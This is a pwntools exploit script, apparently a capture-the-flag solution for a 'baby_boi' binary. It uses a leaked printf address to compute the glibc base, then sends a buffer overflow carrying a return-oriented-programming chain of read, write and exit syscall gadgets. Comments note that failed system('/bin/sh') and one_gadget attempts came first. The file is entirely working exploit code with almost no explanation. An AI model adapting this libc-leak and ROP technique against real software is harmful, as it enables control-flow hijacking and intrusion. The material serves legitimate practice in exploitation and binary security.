from pwn import *
context.arch = 'amd64'

p = process('./baby_boi')

main_addr = 0x00400687 # the address of the main function (unused)
printf_glibc_offset = 0x000606f0 # the offset of printf in the glibc
pop_rdi_addr = 0x0000000000400793 # the address of pop rdi gadget

p.recvuntil('Here I am: ')
haiku = b'Code whispers secrets, x64 bends to my command, Hacking mastery.'
printf_leak = int(p.recv().strip(), 16) # gets the address leak of printf

one_gadget = 0xebce2 # the one gadget found using one_gadget
pop_r12_r13_r14_r15 = 0x000000000040078c # the poppers used for the one_gadget constraints
pop_rax_libc_gadget = 0x0000000000045eb0
pop_rdx_libc_gadget = 0x000000000011f2e7
pop_rsi_r15 = 0x0000000000400791
pop_rsi_libc_gadget = 0x000000000002be51
pop_rbp = 0x0000000000400608 # pop rbp used for the one_gadget constraint
pop_rdi = 0x0000000000400793
syscall_libc_gadget = 0x0000000000029db4
syscall_2_libc_gadget = 0x00000000000a0b42
bss_segment = 0x00601040 # the address of the bss segment, which is writable
zero_arg = p64(0x0) # null argument used for zeroing out the registers
one_arg = p64(0x1)
ret_gadget = 0x000000000040054e
end_of_main = 0x00400728
pop_rbp = 0x0000000000400608

base_libc_addr = printf_leak - printf_glibc_offset # the base address of glibc used by taking the leak (full address) and subtracting by the offset (nibbles on end)

p.elf.libc.address = base_libc_addr # sets the address of p.elf.libc

libc = ELF(p.elf.libc.path) # constructs libc from p.elf.libc.path
libc.address = base_libc_addr # sets the address to the base address found by using found address (leak) - offset (from glibc lookup)

# taking this actual address and subtracting the offset, removes the nibbles on the end, giving us the base glibc address, since
# all glibc functionality comes from a root address, and only has offsets on the ends to separate them from other functionality

bin_sh_addr = next(libc.search(b'/bin/sh'))  # the address of /bin/sh (1st attempt, results in segfault)

read_addr = libc.sym['read']
system_addr = libc.sym['system'] # address of the system call (1st attempt, results in segfault)
libc_pop_rsi = libc.address + pop_rsi_libc_gadget
libc_syscall = libc.address + syscall_libc_gadget
libc_non_looping_syscall = libc.address + syscall_2_libc_gadget
libc_pop_rdx = libc.address + pop_rdx_libc_gadget
libc_pop_rax = libc.address + pop_rax_libc_gadget


one_gadget_addr = libc.address + one_gadget # address of the one gadget, which is the base address + the offset

#          32 + rbp    bss + 0x48 since rbp-0x48 must be w-able    empty out all r12-r15                                                    address of one_gadget
payload = cyclic(40) + p64(pop_rdi) + zero_arg
payload += p64(libc_pop_rsi) + p64(bss_segment)
payload += p64(libc_pop_rdx) + p64(0x40) + p64(0x0)
payload += p64(libc_pop_rax) + p64(0x0)
payload += p64(ret_gadget)
payload += p64(libc.sym['read'])
payload += p64(pop_rdi) + one_arg
payload += p64(libc.sym['write'])
payload += p64(pop_rdi) + zero_arg
payload += p64(libc_pop_rax) + p64(0x3c)
payload += p64(libc_syscall)

p.sendline(payload)
p.sendline(haiku)
print(p.recv())